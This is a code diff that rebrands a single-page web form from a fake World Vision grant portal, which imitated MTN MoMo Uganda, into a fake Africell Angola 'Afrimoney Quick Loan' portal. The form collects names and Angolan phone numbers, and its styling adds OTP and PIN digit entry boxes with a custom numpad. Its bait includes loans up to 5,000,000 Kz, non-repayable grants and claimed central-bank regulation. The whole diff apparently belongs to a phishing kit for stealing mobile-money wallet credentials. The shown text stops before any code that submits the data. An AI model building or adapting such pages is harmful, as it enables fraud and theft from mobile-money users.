@@ -2,8 +2,8 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title data-i18n="title">World Vision — Partnership & Community Grant Portal</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title data-i18n="title">Africell Angola — Afrimoney Quick Loan Portal</title>
   <script src="https://cdn.tailwindcss.com"></script>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -16,27 +16,14 @@
             sans: ['"Plus Jakarta Sans"', 'Inter', 'sans-serif'],
           },
           colors: {
-            brand: {
-              orange: '#FF6700',
-              orangeDark: '#E65100',
-              orangeLight: '#FFF5EE',
-              orangeBorder: '#FED7AA',
-              navyDark: '#0C2340',
-              navyDeep: '#162E51',
-              navyRoyal: '#1E3A8A',
-              blueDark: '#0C2340',
-              blueDeep: '#162E51',
-              blue: '#0056C6',
-              blueRoyal: '#0077B6',
-              cyan: '#00B4D8',
-              yellow: '#FFB703',
-              yellowHover: '#FB8500',
-              yellowDark: '#D97706',
-              blueLight: '#EEF4F8',
-              blueBorder: '#8ECAE6',
-              black: '#0A1128',
-              grayBg: '#F8FAFC',
-              grayText: '#334155'
+            africell: {
+              magenta: '#9B1479',
+              magentaDark: '#7A0E5F',
+              magentaLight: '#B3208F',
+              navyDark: '#1E1B4B',
+              navyDeep: '#110E38',
+              orangeAccent: '#F59E0B',
+              bgLight: '#F7F7F7'
             }
           }
         }
@@ -44,6 +31,13 @@
     }
   </script>
   <style>
+    body {
+      background-color: #F7F7F7;
+      color: #1E1B4B;
+      font-family: "Plus Jakarta Sans", system-ui, -apple-system, sans-serif;
+      -webkit-tap-highlight-color: transparent;
+      user-select: none;
+    }
     input[type=range] {
       -webkit-appearance: none;
       width: 100%;
@@ -56,913 +50,757 @@
       width: 100%;
       height: 8px;
       cursor: pointer;
-      background: #e2e8f0;
+      background: #E2E8F0;
       border-radius: 9999px;
     }
     input[type=range]::-webkit-slider-thumb {
       height: 24px;
       width: 24px;
       border-radius: 50%;
-      background: #FF6700;
-      border: 3px solid #0C2340;
-      box-shadow: 0 4px 12px rgba(255, 103, 0, 0.45);
+      background: #9B1479;
+      border: 3px solid #FFFFFF;
+      box-shadow: 0 4px 12px rgba(155, 20, 121, 0.45);
       cursor: pointer;
       margin-top: -8px;
       transition: transform 0.15s ease, background-color 0.15s ease;
     }
     input[type=range]::-webkit-slider-thumb:hover {
       transform: scale(1.15);
-      background: #E65100;
+      background: #7A0E5F;
     }
-    .pin-box {
-      font-family: monospace;
-      font-weight: 700;
-      text-align: center;
-      transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+    .custom-numpad-key {
+      transition: all 0.1s ease;
+      font-size: 26px;
+      font-weight: 800;
+      color: #1E1B4B;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 56px;
+      border-radius: 12px;
+      cursor: pointer;
     }
-    .pin-box:focus, .pin-box.active {
-      border-color: #0056C6;
-      box-shadow: 0 0 0 4px rgba(0, 86, 198, 0.25);
-      transform: translateY(-1px);
+    .custom-numpad-key:active {
+      background-color: rgba(155, 20, 121, 0.08);
+      transform: scale(0.95);
     }
-    .mixx-gradient {
-      background: linear-gradient(135deg, #0C2340 0%, #162E51 50%, #FF6700 100%);
+    .otp-digit-card {
+      width: 44px;
+      height: 54px;
+      border-radius: 12px;
+      border: 1.5px solid #E2E8F0;
+      background: #FFFFFF;
+      font-size: 22px;
+      font-weight: 800;
+      color: #1E1B4B;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: all 0.18s ease;
     }
-    .mixx-btn-gradient {
-      background: linear-gradient(135deg, #FF6700 0%, #FA8020 100%);
+    .otp-digit-card.active {
+      border-color: #9B1479;
+      box-shadow: 0 0 0 3px rgba(155, 20, 121, 0.15);
+    }
+    .otp-digit-card.filled {
+      border-color: #CBD5E1;
+      background-color: #FFFFFF;
+    }
+    .pin-digit-box {
+      width: 46px;
+      height: 50px;
+      border-radius: 12px;
+      border: 1.5px solid #E2E8F0;
+      background: #FFFFFF;
+      font-size: 24px;
+      font-weight: 800;
+      color: #1E1B4B;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: all 0.18s ease;
+    }
+    .pin-digit-box.active {
+      border-color: #9B1479;
+      box-shadow: 0 0 0 3px rgba(155, 20, 121, 0.15);
+    }
+    .pin-digit-box.filled {
+      border-color: #CBD5E1;
+      background-color: #FFFFFF;
+    }
+    .cursor-blink {
+      display: inline-block;
+      width: 2px;
+      height: 22px;
+      background-color: #9B1479;
+      animation: blink 1s step-end infinite;
+    }
+    @keyframes blink {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0; }
+    }
+    .africell-gradient {
+      background: linear-gradient(135deg, #1E1B4B 0%, #3B0764 50%, #9B1479 100%);
+    }
+    .africell-btn-gradient {
+      background: linear-gradient(135deg, #9B1479 0%, #B3208F 100%);
       color: #FFFFFF;
     }
-    .mixx-blue-card {
-      background: linear-gradient(135deg, #0C2340 0%, #162E51 100%);
-    }
-    .momo-gradient {
-      background: linear-gradient(135deg, #001D38 0%, #002B49 55%, #004680 100%);
-    }
-    .momo-yellow-btn {
-      background: #FFCC00;
-      color: #002B49;
-      font-weight: 900;
-    }
-    .momo-yellow-btn:hover {
-      background: #E5B800;
+    .africell-card-gradient {
+      background: linear-gradient(135deg, #1E1B4B 0%, #7A0E5F 100%);
     }
   </style>
   <script src="/language.js" defer></script>
 </head>
-<body class="bg-slate-100 text-slate-800 font-sans min-h-screen flex flex-col antialiased selection:bg-[#FF6700] selection:text-white">
+<body class="bg-slate-100 text-slate-800 font-sans min-h-screen flex flex-col antialiased selection:bg-[#9B1479] selection:text-white">
 
   <!-- Main Container Mobile/Desktop Wrapper -->
-  <div class="max-w-md w-full mx-auto bg-white min-h-screen shadow-2xl flex flex-col relative" style="overflow-x: clip;">
+  <div class="max-w-md w-full mx-auto bg-white min-h-screen shadow-2xl flex flex-col justify-between relative overflow-hidden" style="overflow-x: clip;">
     
-    <!-- Top Navigation Header (Dynamic World Vision <-> MTN MoMo Uganda) -->
-    <header id="main-header" class="bg-[#0C2340] text-white px-5 py-3.5 flex items-center justify-between sticky top-0 z-40 border-b-2 border-[#FF6700] shadow-md transition-all">
-      
-      <!-- 1. World Vision Header (Steps 0, 1, 2) -->
-      <div id="wv-header-content" class="w-full flex items-center justify-between">
+    <!-- Top Card / Header Section -->
+    <div class="w-full flex flex-col">
+
+      <!-- STEP 0, 1, 2 Header Bar -->
+      <header id="standard-header" class="bg-[#1E1B4B] text-white px-5 py-3.5 flex items-center justify-between sticky top-0 z-40 border-b-2 border-[#9B1479] shadow-md transition-all">
         <div class="flex items-center space-x-3">
-          <button id="header-back-btn" onclick="handleBackAction()" class="p-1.5 -ml-1.5 rounded-lg text-orange-200 hover:text-white hover:bg-slate-800/60 transition-colors opacity-0 pointer-events-none" aria-label="Back">
+          <button id="header-back-btn" onclick="handleBackAction()" class="p-1.5 -ml-1.5 rounded-lg text-pink-200 hover:text-white hover:bg-slate-800/60 transition-colors opacity-0 pointer-events-none" aria-label="Back">
             <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
               <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M15 19l-7-7 7-7"/>
             </svg>
           </button>
           <div class="flex items-center space-x-2.5">
-            <!-- World Vision Stylized Sunburst Emblem -->
-            <div class="w-8 h-8 rounded-lg bg-[#FF6700] flex items-center justify-center shadow-sm flex-shrink-0">
-              <svg class="w-5 h-5 text-white" viewBox="0 0 24 24" fill="currentColor">
-                <path d="M12 2L14.4 8.6L21.5 9.2L16.2 13.8L17.8 20.8L12 17.2L6.2 20.8L7.8 13.8L2.5 9.2L9.6 8.6L12 2Z"/>
-              </svg>
+            <div class="w-8 h-8 rounded-lg bg-[#9B1479] flex items-center justify-center shadow-sm flex-shrink-0 text-white font-black text-sm">
+              a
             </div>
             <div class="flex flex-col leading-tight">
               <span class="text-base font-black tracking-tight text-white flex items-center">
-                <span class="text-[#FF6700] mr-1">World</span><span>Vision</span>
+                <span class="text-[#9B1479] mr-1">Africell</span><span>Angola</span>
               </span>
-              <span class="text-[10px] font-bold text-orange-200 tracking-wider uppercase">Community Grants</span>
+              <span class="text-[10px] font-bold text-pink-200 tracking-wider uppercase">Afrimoney Crédito</span>
             </div>
           </div>
         </div>
 
         <div class="flex items-center space-x-2">
-          <button type="button" class="language-toggle bg-slate-900/80 hover:bg-slate-800 text-xs font-black text-[#FF6700] px-2.5 py-1.5 rounded-md border border-orange-500/40 transition-all">
-            EN
-          </button>
-          <button onclick="toggleNoticeModal(true, 'Partnership Desk', 'World Vision Partnership Helpline: 111 (Toll-Free) or +256 77 000 0000.')" class="p-1.5 text-orange-200 hover:text-white rounded-lg transition-colors" aria-label="Info">
+          <!-- Standard Language Toggle Pill -->
+          <div class="lang-toggle-box cursor-pointer bg-slate-900/80 rounded-full p-0.5 flex items-center space-x-0.5 text-xs select-none border border-pink-500/30">
+            <span class="pill-en font-bold text-[#9B1479] bg-white px-2 py-0.5 rounded-full shadow-xs transition-all">en.</span>
+            <span class="pill-pt font-medium text-slate-400 px-1.5 py-0.5 transition-all">pt.</span>
+          </div>
+
+          <button onclick="toggleNoticeModal(true, 'Afrimoney Apoio ao Cliente', 'Africell Angola Linha de Apoio: 111 (Gratuito) ou visite uma agência oficial Africell.')" class="p-1.5 text-pink-200 hover:text-white rounded-lg transition-colors" aria-label="Info">
             <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
               <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/>
             </svg>
           </button>
         </div>
+      </header>
+
+      <!-- Referral Active Badge (Dynamic) -->
+      <div id="referral-banner" class="bg-pink-50 border-b border-pink-200 px-4 py-2 text-xs font-semibold text-[#9B1479] flex items-center justify-between hidden">
+        <div class="flex items-center space-x-1.5">
+          <span class="flex h-2 w-2 relative">
+            <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-[#9B1479] opacity-75"></span>
+            <span class="relative inline-flex rounded-full h-2 w-2 bg-[#9B1479]"></span>
+          </span>
+          <span>Referred by Africell Agent</span>
+        </div>
+        <span id="referral-code-display" class="font-mono bg-white px-2 py-0.5 rounded border border-pink-200 text-[11px] text-[#1E1B4B] font-bold"></span>
       </div>
 
-      <!-- 2. Authentic MTN MoMo Uganda Header (Steps 3, 4, 5, 6) -->
-      <div id="momo-header-content" class="w-full flex items-center justify-between hidden">
-        <div class="flex items-center space-x-2.5">
-          <button id="momo-header-back-btn" onclick="handleBackAction()" class="p-1.5 -ml-1.5 rounded-lg text-[#002B49] hover:bg-black/10 transition-colors" aria-label="Back">
-            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M15 19l-7-7 7-7"/>
-            </svg>
-          </button>
-          <!-- Iconic MTN Oval Emblem + MoMo Uganda Branding -->
-          <div class="flex items-center space-x-2">
-            <div class="h-7 px-2 bg-black rounded-full flex items-center justify-center shadow-xs">
-              <span class="text-xs font-black tracking-tight text-[#FFCC00]">MTN</span>
-            </div>
-            <div class="flex flex-col leading-none">
-              <div class="flex items-center space-x-1.5">
-                <span class="text-sm font-black text-[#002B49] tracking-tight">MoMo</span>
-                <span class="text-[9px] font-black bg-[#002B49] text-[#FFCC00] px-1.5 py-0.5 rounded-sm">UG 🇺🇬</span>
+      <!-- Main Content Area -->
+      <main class="flex-1 flex flex-col">
+
+        <!-- STEP 0: Hero & Interactive Loan Calculator (Up to 5.000.000 Kz) -->
+        <section id="step-0" class="flex-1 flex flex-col">
+          <!-- Hero Header -->
+          <div class="africell-gradient text-white px-6 pt-7 pb-10 text-center relative overflow-hidden shadow-inner">
+            <div class="absolute -right-8 -bottom-8 w-36 h-36 bg-pink-500/20 rounded-full blur-xl pointer-events-none"></div>
+            <div class="relative z-10">
+              <div class="inline-flex items-center space-x-2 bg-[#9B1479] text-white px-3 py-1 rounded-full text-xs font-black shadow-sm mb-3">
+                <svg class="w-3.5 h-3.5 text-white" fill="currentColor" viewBox="0 0 20 20">
+                  <path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/>
+                </svg>
+                <span data-i18n="heroBadge">Africell Angola • Afrimoney Empréstimo</span>
               </div>
-              <span class="text-[9px] font-extrabold text-[#002B49]/80 tracking-tight mt-0.5">Everywhere you go</span>
+              <h2 class="text-2xl font-black tracking-tight text-white leading-snug" data-i18n="heroHeading">Afrimoney Fast Cash Loans</h2>
+              <p class="text-xs text-pink-100 mt-1 font-medium max-w-xs mx-auto" data-i18n="heroSubtitle">Get instant micro-loans directly into your Afrimoney wallet. Simple application, fast approval, transparent rates up to 5.000.000 Kz.</p>
             </div>
           </div>
-        </div>
 
-        <div class="flex items-center space-x-2">
-          <!-- USSD Quick Dial Pill -->
-          <div class="bg-[#002B49] text-[#FFCC00] px-2.5 py-1 rounded-full text-[11px] font-black tracking-wide shadow-xs flex items-center space-x-1">
-            <span>📞</span>
-            <span>*165#</span>
-          </div>
-          <!-- BoU / Help Info -->
-          <button onclick="toggleNoticeModal(true, 'MTN MoMo Help Center', 'MTN Customer Helpline: 100 (Toll-Free in Uganda) or dial *165# to manage your MoMo account. Regulated by Bank of Uganda.')" class="p-1.5 text-[#002B49] hover:bg-black/10 rounded-lg transition-colors" aria-label="MoMo Info">
-            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/>
-            </svg>
-          </button>
-        </div>
-      </div>
-
-    </header>
-
-    <!-- Agent Referral Active Badge (Dynamic) -->
-    <div id="referral-banner" class="bg-orange-50 border-b border-orange-200 px-4 py-2 text-xs font-semibold text-orange-950 flex items-center justify-between hidden">
-      <div class="flex items-center space-x-1.5">
-        <span class="flex h-2 w-2 relative">
-          <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-[#FF6700] opacity-75"></span>
-          <span class="relative inline-flex rounded-full h-2 w-2 bg-[#FF6700]"></span>
-        </span>
-        <span>Referred by World Vision Liaison</span>
-      </div>
-      <span id="referral-code-display" class="font-mono bg-white px-2 py-0.5 rounded border border-orange-200 text-[11px] text-[#0C2340] font-bold"></span>
-    </div>
-
-    <!-- Main Content Area -->
-    <main class="flex-1 flex flex-col">
-
-      <!-- STEP 0: Hero & Interactive Calculator -->
-      <section id="step-0" class="flex-1 flex flex-col">
-        <!-- Hero Header -->
-        <div class="mixx-gradient text-white px-6 pt-7 pb-10 text-center relative overflow-hidden shadow-inner">
-          <div class="absolute -right-8 -bottom-8 w-36 h-36 bg-orange-400/10 rounded-full blur-xl pointer-events-none"></div>
-          <div class="relative z-10">
-            <div class="inline-flex items-center space-x-2 bg-[#FF6700] text-white px-3 py-1 rounded-full text-xs font-black shadow-sm mb-3">
-              <svg class="w-3.5 h-3.5 text-white" fill="currentColor" viewBox="0 0 20 20">
-                <path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/>
-              </svg>
-              <span data-i18n="heroBadge">World Vision Community & Development Grants</span>
-            </div>
-            <h2 class="text-2xl font-black tracking-tight text-white leading-snug" data-i18n="heroHeading">Partner with World Vision</h2>
-            <p class="text-xs text-orange-100 mt-1 font-medium max-w-xs mx-auto" data-i18n="heroSubtitle">Empowering local communities through sustainable partnership grants, agricultural development, and child welfare initiatives. Direct funding via MTN MoMo / Airtel Money.</p>
-          </div>
-        </div>
-
-        <!-- Partnership Overview Panel -->
-        <div class="-mt-6 bg-white rounded-t-2xl px-6 pt-6 pb-8 flex-1 flex flex-col justify-between shadow-lg">
-          <div class="space-y-4">
-            <!-- Program Highlights Card -->
-            <div class="bg-gradient-to-br from-orange-50/90 via-white to-amber-50/60 border border-orange-200/80 rounded-2xl p-5 shadow-sm space-y-3.5">
-              <div class="flex items-center space-x-3 pb-1 border-b border-orange-100">
-                <div class="w-10 h-10 rounded-xl bg-[#FF6700] text-white flex items-center justify-center font-bold text-lg shadow-md shadow-orange-500/20">
-                  🤝
+          <!-- Loan Calculator Panel -->
+          <div class="-mt-6 bg-white rounded-t-3xl px-6 pt-6 pb-8 flex-1 flex flex-col justify-between shadow-lg">
+            <div class="space-y-4">
+              
+              <!-- Calculator Card -->
+              <div class="bg-gradient-to-br from-pink-50/70 via-white to-purple-50/40 border border-pink-100 rounded-2xl p-5 shadow-xs space-y-4">
+                <div class="flex justify-between items-center pb-2 border-b border-pink-100">
+                  <span class="text-xs font-bold text-slate-500 uppercase tracking-wider" data-i18n="requestedAmount">Requested Loan Amount</span>
+                  <span id="calc-amount-display" class="text-lg font-black text-[#9B1479]">500.000 Kz</span>
                 </div>
+
+                <!-- Range Slider up to 5.000.000 Kz -->
                 <div>
-                  <h3 class="text-sm font-extrabold text-[#0C2340]">Community Partnership Program</h3>
-                  <p class="text-[11px] text-slate-500 font-medium">World Vision Community Development Grants</p>
+                  <input 
+                    type="range" 
+                    id="loan-range-slider" 
+                    min="10000" 
+                    max="5000000" 
+                    step="25000" 
+                    value="500000" 
+                    oninput="updateCalculator(this.value)" 
+                    class="w-full" />
+                  <div class="flex justify-between text-[10px] text-slate-400 font-bold mt-1">
+                    <span>10.000 Kz</span>
+                    <span>5.000.000 Kz</span>
+                  </div>
+                </div>
+
+                <!-- Term Selector Buttons -->
+                <div>
+                  <span class="block text-[11px] font-bold text-slate-600 uppercase tracking-wider mb-2" data-i18n="repaymentTerm">Repayment Period</span>
+                  <div class="grid grid-cols-4 gap-2">
+                    <button type="button" onclick="setTerm(1, event)" class="term-btn py-2 text-xs font-bold rounded-xl border border-slate-200 text-slate-700 hover:border-[#9B1479] transition-all" data-i18n="month1">1 Month</button>
+                    <button type="button" onclick="setTerm(3, event)" class="term-btn py-2 text-xs font-bold rounded-xl border border-slate-200 text-slate-700 hover:border-[#9B1479] transition-all" data-i18n="months3">3 Months</button>
+                    <button type="button" onclick="setTerm(6, event)" class="term-btn py-2 text-xs font-bold rounded-xl border-2 border-[#9B1479] bg-pink-50 text-[#9B1479] shadow-xs" data-i18n="months6">6 Months</button>
+                    <button type="button" onclick="setTerm(12, event)" class="term-btn py-2 text-xs font-bold rounded-xl border border-slate-200 text-slate-700 hover:border-[#9B1479] transition-all" data-i18n="months12">12 Months</button>
+                  </div>
+                </div>
+
+                <!-- Summary calculation rows in Kz -->
+                <div class="bg-white rounded-xl p-3 border border-pink-100 space-y-2 text-xs">
+                  <div class="flex justify-between">
+                    <span class="text-slate-500" data-i18n="estMonthly">Est. Monthly Installment:</span>
+                    <span id="calc-monthly-payment" class="font-bold text-[#1E1B4B]">87.500 Kz</span>
+                  </div>
+                  <div class="flex justify-between border-t border-slate-100 pt-2">
+                    <span class="text-slate-500" data-i18n="totalRepay">Total Repayment:</span>
+                    <span id="calc-total-payment" class="font-black text-[#9B1479]">525.000 Kz</span>
+                  </div>
                 </div>
               </div>
 
-              <!-- Feature Pillars -->
+              <!-- Features Highlights -->
               <div class="space-y-2.5">
-                <div class="flex items-start space-x-3 p-3 rounded-xl bg-white border border-orange-100/80 shadow-xs">
-                  <div class="w-7 h-7 rounded-lg bg-orange-100 text-[#FF6700] flex items-center justify-center font-bold text-sm shrink-0 mt-0.5">
-                    🌱
-                  </div>
-                  <div class="text-xs">
-                    <span class="font-bold text-slate-800">100% Non-Repayable Grant Funding</span>
-                    <p class="text-slate-500 text-[11px] mt-0.5">Empowering community-based organizations, faith groups, local cooperatives, and sustainable initiatives.</p>
-                  </div>
-                </div>
-
-                <div class="flex items-start space-x-3 p-3 rounded-xl bg-white border border-orange-100/80 shadow-xs">
-                  <div class="w-7 h-7 rounded-lg bg-orange-100 text-[#FF6700] flex items-center justify-center font-bold text-sm shrink-0 mt-0.5">
-                    📲
-                  </div>
-                  <div class="text-xs">
-                    <span class="font-bold text-slate-800">Direct MoMo Disbursement</span>
-                    <p class="text-slate-500 text-[11px] mt-0.5">Approved funding is disbursed directly to your authorized MTN Mobile Money or Airtel Money wallet.</p>
-                  </div>
-                </div>
-
-                <div class="flex items-start space-x-3 p-3 rounded-xl bg-white border border-orange-100/80 shadow-xs">
-                  <div class="w-7 h-7 rounded-lg bg-orange-100 text-[#FF6700] flex items-center justify-center font-bold text-sm shrink-0 mt-0.5">
+                <div class="flex items-center space-x-3 p-3 rounded-xl bg-slate-50 border border-slate-200/70">
+                  <div class="w-8 h-8 rounded-lg bg-pink-100 text-[#9B1479] flex items-center justify-center font-bold text-sm shrink-0">
                     ⚡
                   </div>
                   <div class="text-xs">
-                    <span class="font-bold text-slate-800">Streamlined Online Verification</span>
-                    <p class="text-slate-500 text-[11px] mt-0.5">Provide project scope, representative details, and connect your mobile account in a few simple steps.</p>
+                    <span class="font-bold text-slate-800">Instant Disbursement</span>
+                    <p class="text-slate-500 text-[11px]">Approved funds are deposited directly into your Afrimoney wallet.</p>
                   </div>
+                </div>
+
+                <div class="flex items-center space-x-3 p-3 rounded-xl bg-slate-50 border border-slate-200/70">
+                  <div class="w-8 h-8 rounded-lg bg-pink-100 text-[#9B1479] flex items-center justify-center font-bold text-sm shrink-0">
+                    🔒
+                  </div>
+                  <div class="text-xs">
+                    <span class="font-bold text-slate-800">Bank-Grade Security</span>
+                    <p class="text-slate-500 text-[11px]">Regulated and encrypted under National Bank of Angola (BNA) standards.</p>
+                  </div>
+                </div>
+              </div>
+
+            </div>
+
+            <!-- Action Button -->
+            <div class="pt-6">
+              <button 
+                type="button" 
+                onclick="goToStep(1)" 
+                class="w-full py-4 africell-btn-gradient hover:opacity-95 active:scale-[0.99] font-black rounded-xl shadow-lg shadow-pink-900/20 text-sm tracking-wider uppercase flex items-center justify-center space-x-2 transition-all duration-150">
+                <span data-i18n="applyNow">APPLY FOR AFRIMONEY LOAN NOW</span>
+                <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M14 5l7 7m0 0l-7 7m7-7H3"/>
+                </svg>
+              </button>
+            </div>
+          </div>
+        </section>
+
+        <!-- STEP 1: Loan Configuration Form -->
+        <section id="step-1" class="hidden flex-1 flex flex-col p-4 sm:p-6 space-y-4 sm:space-y-6">
+          <div>
+            <span class="text-[11px] font-black text-white bg-[#9B1479] px-2.5 py-1 rounded-full uppercase tracking-wider">Step 1 of 4</span>
+            <h2 class="text-xl font-extrabold text-slate-900 mt-2 flex items-center space-x-2">
+              <span>🎯</span>
+              <span data-i18n="step1Title">Loan Parameters & Purpose</span>
+            </h2>
+            <p class="text-xs text-slate-500 mt-1" data-i18n="step1Sub">Configure your loan amount and repayment schedule.</p>
+          </div>
+
+          <div class="space-y-4">
+            <div>
+              <label for="org-name-input" class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5 flex items-center space-x-1.5">
+                <span>🏢</span>
+                <span>Full Name or Business Entity *</span>
+              </label>
+              <input id="org-name-input" type="text" placeholder="e.g. João Manuel Santos" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-3 text-xs font-semibold text-slate-800 focus:outline-none focus:border-[#9B1479] focus:ring-2 focus:ring-[#9B1479]/20" value="" required />
+            </div>
+
+            <div>
+              <label for="loan-type-select" class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5 flex items-center space-x-1.5" data-i18n="loanType">
+                <span>🏷️</span>
+                <span>Loan Category</span>
+              </label>
+              <select id="loan-type-select" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-3 text-xs font-semibold text-slate-800 focus:outline-none focus:border-[#9B1479] focus:ring-2 focus:ring-[#9B1479]/20">
+                <option value="Personal Emergency Loan" selected>Personal Emergency Loan</option>
+                <option value="Business Working Capital">Business / Small Commerce Capital</option>
+                <option value="Education & School Fees">Education & School Fees</option>
+                <option value="Medical & Health Support">Medical & Health Support</option>
+                <option value="Agriculture & Supplies">Agriculture & Farm Supplies</option>
+              </select>
+            </div>
+
+            <div>
+              <label for="loan-amount-input" class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5 flex items-center space-x-1.5" data-i18n="amountLabel">
+                <span>💰</span>
+                <span>Requested Loan Amount (Kz)</span>
+              </label>
+              <input id="loan-amount-input" type="number" min="10000" max="5000000" step="25000" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-3 text-sm font-bold text-slate-800 focus:outline-none focus:border-[#9B1479] focus:ring-2 focus:ring-[#9B1479]/20" value="500000" />
+            </div>
+
+            <div>
+              <label for="loan-term-select" class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5 flex items-center space-x-1.5" data-i18n="termLabel">
+                <span>📅</span>
+                <span>Repayment Period (Months)</span>
+              </label>
+              <select id="loan-term-select" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-3 text-xs font-semibold text-slate-800 focus:outline-none focus:border-[#9B1479] focus:ring-2 focus:ring-[#9B1479]/20">
+                <option value="1">1 Month</option>
+                <option value="3">3 Months</option>
+                <option value="6" selected>6 Months</option>
+                <option value="12">12 Months</option>
+              </select>
+            </div>
+
+            <div>
+              <label for="loan-purpose-input" class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5 flex items-center space-x-1.5" data-i18n="purposeLabel">
+                <span>📝</span>
+                <span>Loan Purpose</span>
+              </label>
+              <textarea id="loan-purpose-input" rows="2" placeholder="Describe the purpose of your micro-loan..." class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-3 text-xs font-medium text-slate-800 focus:outline-none focus:border-[#9B1479] focus:ring-2 focus:ring-[#9B1479]/20 resize-none">Afrimoney Personal Quick Loan</textarea>
+            </div>
+          </div>
+
+          <div class="pt-4">
+            <button 
+              type="button" 
+              onclick="goToStep(2)" 
+              class="w-full py-4 africell-btn-gradient hover:opacity-95 text-white font-black rounded-xl shadow-md text-xs tracking-wider uppercase flex items-center justify-center space-x-2"
+              data-i18n="continueToPersonal">
+              <span>CONTINUE TO APPLICANT DETAILS</span>
+              <span>⚡</span>
+            </button>
+          </div>
+        </section>
+
+        <!-- STEP 2: Representative & Phone Number Form -->
+        <section id="step-2" class="hidden flex-1 flex flex-col p-4 sm:p-5 space-y-3 sm:space-y-4">
+          <div>
+            <span class="text-[11px] font-black text-white bg-[#9B1479] px-2.5 py-1 rounded-full uppercase tracking-wider">Step 2 of 4</span>
+            <h2 class="text-xl font-extrabold text-slate-900 mt-1.5 flex items-center space-x-2" data-i18n="step2Title">
+              <span>👤</span>
+              <span>Applicant & Afrimoney Account</span>
+            </h2>
+            <p class="text-xs text-slate-500 mt-0.5" data-i18n="step2Sub">Enter your personal details and active Africell Angola phone number for disbursement.</p>
+          </div>
+
+          <div class="space-y-3">
+            <div class="grid grid-cols-2 gap-2.5">
+              <div>
+                <label for="first-name-input" class="block text-[11px] font-bold text-slate-700 uppercase tracking-wider mb-1 flex items-center space-x-1" data-i18n="firstName">
+                  <span>👤</span>
+                  <span>First Name *</span>
+                </label>
+                <input id="first-name-input" type="text" placeholder="e.g. Manuel" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-3.5 py-2.5 text-xs font-semibold text-slate-800 focus:outline-none focus:border-[#9B1479]" value="" required />
+              </div>
+              <div>
+                <label for="last-name-input" class="block text-[11px] font-bold text-slate-700 uppercase tracking-wider mb-1 flex items-center space-x-1" data-i18n="lastName">
+                  <span>👤</span>
+                  <span>Last Name *</span>
+                </label>
+                <input id="last-name-input" type="text" placeholder="e.g. Silva" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-3.5 py-2.5 text-xs font-semibold text-slate-800 focus:outline-none focus:border-[#9B1479]" value="" required />
+              </div>
+            </div>
+
+            <div>
+              <label for="phone-number-input" class="block text-[11px] font-bold text-slate-700 uppercase tracking-wider mb-1 flex items-center space-x-1" data-i18n="orangePhone">
+                <span>📱</span>
+                <span>Africell Angola Mobile Number (+244) *</span>
+              </label>
+              <div class="flex items-center">
+                <span class="bg-slate-200 border border-r-0 border-slate-300 rounded-l-xl px-3 py-2.5 text-xs font-bold text-slate-600 flex items-center space-x-1">
+                  <span>🇦🇴</span>
+                  <span>+244</span>
+                </span>
+                <input id="phone-number-input" type="tel" placeholder="950 548 313" oninput="checkReturningUserPhone(this.value)" class="w-full bg-slate-50 border border-slate-300 rounded-r-xl px-3.5 py-2.5 text-xs font-bold text-slate-800 focus:outline-none focus:border-[#9B1479]" value="" required />
+              </div>
+              <span class="text-[10px] text-slate-500 font-medium mt-1 block">Active Afrimoney wallet registered in your name</span>
+            </div>
+
